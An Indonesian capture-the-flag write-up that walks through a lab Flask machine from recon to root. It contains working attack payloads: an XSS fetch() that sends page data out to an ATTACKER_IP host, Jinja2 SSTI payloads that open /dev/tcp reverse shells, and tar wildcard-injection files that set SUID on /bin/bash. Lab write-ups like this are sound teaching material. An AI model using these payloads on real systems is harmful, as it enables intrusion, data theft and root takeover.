
**Target IP** 10.1.2.141
**Difficulty** Easy
**OS** Linux (Debian)
**Machine Maker** easygoingg

---

## 1. Ringkasan

Mesin target menjalankan tiga layanan: SSH (22), Apache default page (80), dan sebuah aplikasi web Flask (5000). Jalur eksploitasi dimulai dari **Stored XSS** pada fitur update profil, berkembang menjadi **Server-Side Template Injection (SSTI)** pada template engine Jinja2, yang kemudian dimanfaatkan untuk mendapatkan **Remote Code Execution (RCE)** sebagai user `syahit`. Privilege escalation ke `root` dicapai melalui **tar wildcard injection** pada cronjob backup yang berjalan setiap menit.

---

## 2. Reconnaissance

### 2.1 Port Scanning

```bash
rustscan -a 10.1.2.141 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.54 (Debian)
5000/tcp open  upnp?   (teridentifikasi belakangan sebagai Werkzeug/Flask)
```

### 2.2 Enumerasi Port 80


```bash
whatweb http://10.1.2.141
feroxbuster -u http://10.1.2.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 --no-recursion --filter-status 404,400 -k --dont-filter -x html,php,txt --redirects
```

**Hasil:** Apache 2.4.54 Debian Default Page. Hanya berisi halaman default Apache, dokumentasi manual bawaan, dan direktori `/icons/`. Pengecekan `searchsploit Apache 2.4.54` tidak menghasilkan exploit yang relevan (hasil pencarian didominasi CVE untuk modul/software lain seperti PHP-CGI dan Tomcat yang tidak terpasang). **Port 80 disimpulkan sebagai dead end / decoy.**

### 2.3 Enumerasi Port 5000

```bash
whatweb http://10.1.2.141:5000
```

**Hasil:**

```
Bootstrap[3.3.7], Werkzeug[2.2.3], Python[3.11.2], Title[My Web]
```

Teridentifikasi sebagai aplikasi **Flask** (Werkzeug 2.2.3, Python 3.11.2).

```bash
feroxbuster -u http://10.1.2.141:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 -k --dont-filter -x html,php,txt --redirects
```

**Endpoint ditemukan:**

|Endpoint|Keterangan|
|---|---|
|`/`|Landing page|
|`/signup`|Registrasi user|
|`/login`|Autentikasi|
|`/profile`|Edit profil (butuh login)|
|`/dashboard`|Dashboard user (butuh login)|
|`/static/*`|Asset CSS|

Akses ke `/profile` dan `/dashboard` tanpa cookie session diarahkan (redirect) ke `/login?next=...`, menandakan access control berjalan normal.

---

## 3. Autentikasi & Analisis Sesi

### 3.1 Login dengan CSRF Token

Aplikasi menggunakan proteksi CSRF (Flask-WTF). Percobaan login awal tanpa menyertakan `csrf_token` yang valid gagal secara diam-diam (response `200 OK` tetapi tetap menampilkan form login).

**Solusi:** Ambil `csrf_token` dari halaman `/login` (GET) terlebih dahulu, gunakan cookie session yang sama untuk request POST berikutnya.

```bash
curl -s -c cookies.txt http://10.1.2.141:5000/login -o login.html
CSRF=$(grep -oP 'name="csrf_token"[^>]*value="\K[^"]+' login.html)

curl -i -X POST http://10.1.2.141:5000/login \
  -b cookies.txt -c cookies.txt \
  --data-urlencode "csrf_token=$CSRF" \
  --data-urlencode "username=greed" \
  --data-urlencode "password=Kingdom1990"
```

**Hasil:** `302 FOUND` dengan `Location: /dashboard` login berhasil, session cookie ter-update dengan data user yang telah terautentikasi.

### 3.2 Dekode Session Cookie

Cookie session Flask (`itsdangerous`) tidak terenkripsi, hanya ditandatangani. Isinya dapat dibaca tanpa mengetahui `SECRET_KEY`:


```json
{
  "_fresh": true,
  "_id": "...",
  "_user_id": "1",
  "csrf_token": "..."
}
```

---

## 4. Stored Cross-Site Scripting (XSS)

### 4.1 Penemuan

Endpoint `POST /profile` menerima parameter `name` dan menyimpannya tanpa sanitasi HTML.

```bash
curl -i -X POST http://10.1.2.141:5000/profile \
  -b cookies.txt -c cookies.txt \
  --data-urlencode "csrf_token=$CSRF" \
  --data-urlencode "name=<script>alert(1)</script>" \
  --data-urlencode "password=Kingdom1990"
```

Payload tersimpan dan dirender kembali sebagai HTML aktif ketika halaman `/dashboard` diakses ulang **Stored XSS confirmed**.

### 4.2 Percobaan Exfiltrasi

Karena cookie session diberi flag `HttpOnly`, pencurian cookie via `document.cookie` tidak dimungkinkan. Sebagai gantinya, XSS dimanfaatkan untuk membaca isi halaman lain melalui `fetch()` dengan `credentials: 'include'`:

```html
<script>
fetch('http://10.1.2.141:5000/profile', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('http://ATTACKER_IP:8000/leak?d=' + encodeURIComponent(d)))
</script>
```

Hasil investigasi menunjukkan tidak ditemukan mekanisme bot/admin otomatis yang mengunjungi konten yang di-inject, sehingga jalur XSS diarahkan untuk eksplorasi payload lain pada parameter `name` yang sama.

---

## 5. Server-Side Template Injection (SSTI) → RCE

### 5.1 Deteksi SSTI

Berdasarkan stack Flask/Jinja2, parameter `name` diuji dengan payload matematis klasik:

```bash
curl -i -X POST http://10.1.2.141:5000/profile \
  -b cookies.txt -c cookies.txt \
  --data-urlencode "csrf_token=$CSRF" \
  --data-urlencode "name={{7*7}}" \
  --data-urlencode "password=Kingdom1990"
```

**Hasil:** Nilai `name` yang dirender ulang di `/dashboard` menampilkan `49`, bukan literal `{{7*7}}` **SSTI pada Jinja2 confirmed**.

### 5.2 Information Disclosure via `{{config}}`

```bash
--data-urlencode "name={{config}}"
```

**Hasil (parsial):**

```python
SECRET_KEY: 'NOBODY-CAN-GUESS-THIS'
SQLALCHEMY_DATABASE_URI: 'sqlite:///database.db'
```

`SECRET_KEY` yang bocor ini berpotensi dipakai untuk forge session (`flask-unsign --sign`) sebagai jalur alternatif tanpa RCE.

### 5.3 Eksploitasi RCE — Percobaan Pertama (Gagal)

```bash
--data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1\"').read() }}"
```

**Dampak:** Aplikasi menjadi tidak responsif (`curl` ke root URL mengembalikan status `000`).

**Analisis akar masalah:** `os.popen(...).read()` bersifat **blocking**  `.read()` menunggu proses child mengirim EOF (proses selesai). Karena `bash -i` adalah shell interaktif yang tidak pernah selesai dengan sendirinya (menunggu input dari koneksi netcat), worker request HTTP yang memicunya tertahan selamanya. Karena Werkzeug dev server berjalan single-threaded secara default, satu worker yang macet membuat seluruh server tidak dapat menerima request baru.

### 5.4 Eksploitasi RCE — Percobaan Kedua (Berhasil)

```bash
--data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen(['/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'], start_new_session=True) }}"
```

**Perbedaan kunci:**

- `subprocess.Popen()` tanpa `.read()`/`.wait()`/`.communicate()` bersifat **non-blocking** — proses child di-spawn dan eksekusi Python langsung lanjut tanpa menunggu proses tersebut selesai.
- `start_new_session=True` (setara `setsid`) melepaskan proses child dari process group worker Flask, sehingga reverse shell berjalan independen dari request HTTP yang memicunya.

**Hasil:** Reverse shell berhasil diterima di listener:

```
uid=1000(syahit) gid=1000(syahit) groups=1000(syahit),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### 5.5 Flag User

```
user.txt: e81a62f4**************
```

---

## 6. Privilege Escalation — Tar Wildcard Injection

### 6.1 Enumerasi

```bash
sudo -l          # butuh password, tidak dapat digunakan
find / -perm -4000 -type f 2>/dev/null   # tidak ada SUID binary yang exploitable
cat /etc/crontab
```

**Cronjob mencurigakan ditemukan:**

```
*/1 * * * * root /opt/backup.sh
```

```bash
cat /opt/backup.sh
```

```bash
#!/bin/bash
cd /home/syahit/dev
tar -czf /var/backups/dev.tgz *
```

### 6.2 Analisis Kerentanan

Script berjalan sebagai **root** setiap menit dan mengarsipkan seluruh isi direktori `/home/syahit/dev` menggunakan wildcard `*`. Direktori ini dimiliki oleh user `syahit` (writable oleh attacker). Karena `*` di-expand oleh shell **sebelum** dieksekusi oleh `tar`, nama file yang diawali tanda `-` akan diinterpretasikan sebagai **opsi command-line**, bukan nama file teknik ini dikenal sebagai **tar wildcard injection**.

`tar` memiliki opsi `--checkpoint` dan `--checkpoint-action=exec=<command>` yang dapat disalahgunakan untuk mengeksekusi perintah arbitrer selama proses arsip berjalan.

### 6.3 Eksploitasi

**Langkah 1  Siapkan payload:**

```bash
cd /home/syahit/dev
echo 'chmod +s /bin/bash' > payload.sh
chmod +x payload.sh
```

**Langkah 2 — Buat file trigger yang namanya berfungsi sebagai argumen tar:**

```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh payload.sh"
```

**Langkah 3 Tunggu cronjob berjalan (maksimal 1 menit).**

**Langkah 4 Verifikasi:**

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash  (bit SUID berhasil di-set)
```

**Langkah 5 Escalate:**

```bash
/bin/bash -p
id
# euid=0(root)
```

### 6.4 Flag Root

```
root.txt: a4d4606e26**************
```